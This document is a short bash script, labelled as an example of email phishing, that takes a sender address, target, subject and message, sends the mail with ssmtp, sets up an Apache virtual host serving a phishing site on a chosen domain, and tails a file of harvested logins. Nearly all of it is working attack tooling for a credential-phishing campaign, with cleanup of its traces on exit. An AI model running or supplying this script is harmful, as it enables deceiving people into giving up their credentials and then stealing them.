#! /bin/bash -e

echo  "---------- An exemple of email phishing ----------"

trap onExit EXIT
function onExit(){
	rm -rf /tmp/phishing
	#rm -r /var/www/phishing
	rm -f /etc/apache2/sites-available/phishing.conf
	rm -f /var/www/phishing/logins.txt
}

echo "Send a mail to the target : "
read -p "From: " sender 
read -p 'target mail: ' target 
read -p 'subject: ' subject 
read -p "message: " message

if [ -d /tmp/phishing ]
then
	echo "directory created"
else
	mkdir /tmp/phishing
fi

echo "To: $target" > /tmp/phishing/mail.txt
echo "From: $sender" >> /tmp/phishing/mail.txt
echo "Subject: $subject" >> /tmp/phishing/mail.txt
echo "$message" >> /tmp/phishing/mail.txt

ssmtp -v $target < /tmp/phishing/mail.txt 

echo "Apache is used to run the web server, run 'sudo apt install apache2' if not installed"

if [ ! -d /var/www/phishing ]
then 
	mkdir /var/www/phishing
fi
echo "Add website files to /var/www/phishing"

read -p "website domain: " website
# virtual host config
tee /etc/apache2/sites-available/phishing.conf <<EOF
<VirtualHost *:80>
	ServerAdmin mymail@gmail.com
	DocumentRoot /var/www/phishing
	ServerName $website
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
EOF

a2ensite phishing.conf
service apache2 reload

echo "logins retrieved from users: "
touch /var/www/phishing/logins.txt
tail -f /var/www/phishing/logins.txt

